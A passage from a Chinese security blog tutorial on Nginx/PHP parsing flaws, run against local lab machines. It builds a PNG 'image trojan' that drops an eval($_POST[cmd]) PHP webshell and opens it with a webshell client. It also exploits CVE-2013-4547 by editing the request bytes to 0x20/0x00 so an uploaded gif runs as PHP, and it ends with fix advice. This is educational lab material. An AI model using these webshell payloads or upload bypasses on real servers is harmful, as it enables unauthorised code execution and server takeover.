<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-5dffa1cd-77a7-41f2-98a9-0eb57e78e880.png" alt="*.conf" title="Untitled-5dffa1cd-77a7-41f2-98a9-0eb57e78e880"></p>
<p>重启nginx和php-fpm服务，通过浏览器访问<code>xxx.jpg/.php</code>，解析成功。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-ab9458dc-ba65-4ba0-b78d-51810e55c599.png" alt="浏览器访问" title="Untitled-ab9458dc-ba65-4ba0-b78d-51810e55c599"></p>
<p>4、制作图片马</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">copy xx.png/b + yy.txt/a xy.png
    
<span style="color:#75715e"># yy.txt内容如下：</span>
    
&lt;?PHP fputs<span style="color:#f92672">(</span>fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;shell.php&#39;</span>,<span style="color:#e6db74">&#39;w&#39;</span><span style="color:#f92672">)</span>,<span style="color:#e6db74">&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;</span><span style="color:#f92672">)</span>;?&gt;
</code></pre></div><p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-c68b2ac7-e104-492c-99a0-5ee9e1dba717.png" alt="制作图片马" title="Untitled-c68b2ac7-e104-492c-99a0-5ee9e1dba717"></p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-afc246ef-eeef-4732-9c39-690b32d35800.png" alt="制作成功" title="Untitled-afc246ef-eeef-4732-9c39-690b32d35800"></p>
<p>上传一个png图片马，浏览器访问。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-f7eb5fae-aa0e-40de-97b5-a6086cf409d1.png" alt="浏览器访问" title="Untitled-f7eb5fae-aa0e-40de-97b5-a6086cf409d1"></p>
<p>菜刀访问生成的shell.php文件，<a href="http://192.168.63.131/3.png/3.php">http://192.168.63.131/</a>shell.php。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-f265db17-c82f-4615-ae98-018d7b4bbae7.png" alt="菜刀访问" title="Untitled-f265db17-c82f-4615-ae98-018d7b4bbae7"></p>
<hr>
<p>参考：<a href="https://blog.csdn.net/wn314/article/details/77388289">https://blog.csdn.net/wn314/article/details/77388289</a></p>
<p>5、修复建议：</p>
<ul>
<li>
<p>将php.ini配置文件中的cgi.fix_pathinfo=1改成cgi.fix_pathinfo=0</p>
</li>
<li>
<p>通过新版本的php中引入了“security.limit_extensions”机制，限制了可执行文件的后缀。</p>
</li>
</ul>
<p>6、<strong>Nginx 文件名逻辑漏洞（CVE-2013-4547）</strong></p>
<p>扩展下另一个漏洞，也被叫做为00截断。</p>
<p>影响版本：<code>Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7</code></p>
<p>nginx的配置文件中：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">location</span> <span style="color:#f92672">~</span> <span style="color:#a6e22e">\</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#960050;background-color:#1e0010">$</span> {
			<span style="color:#a6e22e">root</span>           <span style="color:#a6e22e">html</span>;
			<span style="color:#a6e22e">fastcgi_pass</span>   <span style="color:#ae81ff">127.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0.1</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9000</span>;
			<span style="color:#a6e22e">fastcgi_index</span>  <span style="color:#a6e22e">index</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span>;
			<span style="color:#a6e22e">fastcgi_param</span>  <span style="color:#a6e22e">SCRIPT_FILENAME</span>  $document_root$fastcgi_script_name;
			<span style="color:#66d9ef">include</span>        <span style="color:#a6e22e">fastcgi_params</span>;
<span style="color:#75715e">#           try_files   $uri = 404;
</span><span style="color:#75715e"></span>
		}
</code></pre></div><p>默认匹配到.php结尾的文件就发给fastcgi进行解析，</p>
<p>在cgi.fix_pathinfo=0的情况下，默认只允许执行php后缀的文件，如果存在**Nginx 文件名逻辑漏洞（CVE-2013-4547），**则非法字符空格和截止符<code>（\0）</code>会导致Nginx解析URI时的有限状态机混乱，允许攻击者通过非编码空格绕过后缀限制，从而执行php代码。</p>
<p>利用vulhub环境测试,测试页面如下：</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-1d50dda4-825f-4003-b44f-f14a56a699e7.png" alt="表单" title="Untitled-1d50dda4-825f-4003-b44f-f14a56a699e7"></p>
<p>6.1、上传gif图片文件，burp拦截请求。</p>
<p>gif图片文件内容如下：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#a6e22e">phpinfo</span>();<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-817271cb-547d-4892-a1fe-126812e1f942.png" alt="gif内容" title="Untitled-817271cb-547d-4892-a1fe-126812e1f942"></p>
<p>将1.gif改为1.gif[空格]，.gif后面加一个空格，点击forward，提示上传成功。</p>
<p>6.2、浏览器访问</p>
<p>浏览器访问192.168.63.140:8080/uploadfiles/1.gif&hellip;php，在gif后面加&hellip;php，方便改包，burp将请求包拦截下来。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-defd3343-7920-48bf-8c4b-d22561c25d1e.png" alt="包拦截" title="Untitled-defd3343-7920-48bf-8c4b-d22561c25d1e"></p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-45330e6b-eeef-4e17-8df4-1f9c37c772ce.png" alt="改包" title="Untitled-45330e6b-eeef-4e17-8df4-1f9c37c772ce"></p>
<p>将gif后的第一个点改为20，第二个点改成00，点击forward。</p>
<p>最终请求的url就是192.168.63.140:8080/uploadfiles/1.gif1.gif[0x20][0x00].php</p>
<p>6.3、php代码成功执行。</p>
<p><img src="https://www.github.com/olist213/olistimg/raw/master/olistimg/Untitled-58e895d5-8fe9-4bb4-b5e0-176691df7cb0.png" alt="代码成功执行" title="Untitled-58e895d5-8fe9-4bb4-b5e0-176691df7cb0"></p>

    </div>

    <div class="post-copyright">
             
            <p class="copyright-item">
                <span>Author:</span>
                <span>Olist.213 </span>
                </p>
            
           
             
            <p class="copyright-item">
                    <span>Link:</span>
                    <a href=https://olist213.github.io/posts/parsing_vulnerability/>https://olist213.github.io/posts/parsing_vulnerability/</span>
            </p>
            
            
    </div>

  
    <div class="post-tags">
        
            <section>
            <i class="iconfont icon-tag"></i>Tag(s): 
            
            <span class="tag"><a href="https://olist213.github.io/tags/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/">
                    #解析漏洞</a></span>
            
            </section>
        
        <section>
                <a href="javascript:window.history.back();">back</a></span> · 
                <span><a href="https://olist213.github.io">home</a></span>
        </section>
    </div>

    <div class="post-nav">
        
        <a href="https://olist213.github.io/posts/blackmail_virus/" class="prev" rel="prev" title="记一次某医院勒索软件事件处理整理"><i class="iconfont icon-left"></i>&nbsp;记一次某医院勒索软件事件处理整理</a>
         
        
        <a href="https://olist213.github.io/posts/virus/" class="next" rel="next" title="勒索病毒防护建议">勒索病毒防护建议&nbsp;<i class="iconfont icon-right"></i></a>
        
    </div>

    <div class="post-comment">
          
                 
          
    </div>
</article>
          </div>
		   </main>
      <footer class="footer">
    <div class="copyright">
        &copy;
        
        <span itemprop="copyrightYear">2018 - 2021</span>
        
        <span class="with-love">
    	 <i class="iconfont icon-love"></i> 
         </span>
         
            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
         

         
		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
    </div>
</footer>












    
     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
      
     <script src="/js/vendor_gallery.min.js" async="" ></script>
    
  



     </div>
  </body>
</html>
